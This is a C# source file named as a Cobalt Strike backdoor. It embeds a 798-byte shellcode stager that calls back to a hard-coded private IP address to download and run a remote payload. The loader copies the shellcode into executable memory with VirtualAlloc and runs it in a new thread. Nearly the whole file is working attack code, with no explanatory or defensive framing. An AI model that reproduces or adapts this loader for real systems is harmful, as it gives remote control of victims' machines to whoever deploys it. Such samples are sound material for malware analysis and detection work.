﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace CobaltStrike_Backdoor
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            /* length: 798 bytes */
            byte[] buf = new byte[798] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0x39, 0x05, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x50, 0x59, 0x52, 0x61, 0x00, 0x67, 0xe4, 0x0b, 0x32, 0xa6, 0xcc, 0xf5, 0x54, 0x85, 0x94, 0xaf, 0x84, 0x65, 0x00, 0xf5, 0x0e, 0x98, 0x22, 0x73, 0xf5, 0xda, 0xb6, 0x5e, 0xc3, 0xaa, 0x8b, 0xcc, 0x5d, 0xee, 0xa5, 0xf0, 0x87, 0x3a, 0x58, 0x58, 0xcf, 0x84, 0x50, 0xf5, 0xea, 0x0f, 0xc4, 0x86, 0x9d, 0x2b, 0xfc, 0xfc, 0x74, 0x9b, 0x05, 0x5e, 0xfb, 0x7b, 0x9e, 0xae, 0x9f, 0x20, 0x06, 0x50, 0xc3, 0xd0, 0x35, 0x81, 0x79, 0x06, 0xfb, 0x19, 0x71, 0x79, 0x0e, 0x96, 0xe1, 0xa3, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x58, 0x42, 0x4c, 0x57, 0x50, 0x37, 0x3b, 0x20, 0x5a, 0x75, 0x6e, 0x65, 0x57, 0x50, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x9a, 0x8f, 0x49, 0x82, 0x1b, 0x5f, 0xf2, 0x5d, 0x73, 0x10, 0x7f, 0x30, 0x91, 0xaf, 0xd0, 0x8d, 0x49, 0xd1, 0xcb, 0x77, 0x9f, 0x61, 0x13, 0x24, 0xfa, 0x37, 0x06, 0x23, 0x85, 0xcd, 0x46, 0xfa, 0x1e, 0xa7, 0x71, 0x4b, 0x43, 0xc6, 0xf6, 0x21, 0xa5, 0xc1, 0x48, 0x4f, 0xc9, 0x95, 0x97, 0xf7, 0x6f, 0x58, 0x16, 0x6a, 0xdf, 0xa6, 0x56, 0x90, 0xe8, 0x31, 0xb9, 0xc0, 0x8f, 0x62, 0x57, 0xbd, 0xa1, 0xd0, 0x5c, 0x8f, 0x8c, 0x48, 0x69, 0x30, 0x3d, 0x14, 0x59, 0xca, 0x66, 0x57, 0xa8, 0xbf, 0x88, 0x3b, 0x9d, 0xe0, 0x05, 0xd8, 0x3d, 0x1f, 0xbf, 0x18, 0x74, 0x78, 0x1d, 0x9b, 0x6e, 0x52, 0x7c, 0xf0, 0x3a, 0x8f, 0x93, 0x4b, 0xf7, 0x22, 0x58, 0x37, 0x48, 0x48, 0x81, 0x10, 0xa2, 0xa5, 0xaa, 0xa7, 0x5b, 0x9d, 0xaa, 0xbe, 0x89, 0x2f, 0xbf, 0xfd, 0xd9, 0xd9, 0x01, 0xee, 0x15, 0x82, 0xca, 0xd2, 0x65, 0xe2, 0x03, 0x7c, 0xf8, 0x3e, 0xe3, 0x75, 0x0e, 0xce, 0xe9, 0x72, 0x0a, 0x4d, 0xa0, 0xe3, 0xe5, 0xc5, 0xc5, 0xb5, 0xf7, 0x6b, 0x55, 0xe7, 0xaf, 0x4e, 0x85, 0x39, 0xc6, 0x85, 0xa3, 0xa1, 0x7d, 0x03, 0x52, 0xcd, 0x30, 0xc3, 0xf8, 0xc0, 0x25, 0x18, 0xf8, 0xcb, 0x30, 0x09, 0x76, 0x75, 0x57, 0xa1, 0xe2, 0x86, 0x31, 0x7c, 0x68, 0x10, 0x32, 0xe8, 0x7f, 0x20, 0x5c, 0x85, 0x4e, 0x40, 0x62, 0xcd, 0xe4, 0xb2, 0xb2, 0xa4, 0xfa, 0x2c, 0x64, 0xe0, 0x9d, 0xd5, 0x70, 0x2e, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x31, 0x30, 0x37, 0x00, 0x12, 0x34, 0x56, 0x78 };
            
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
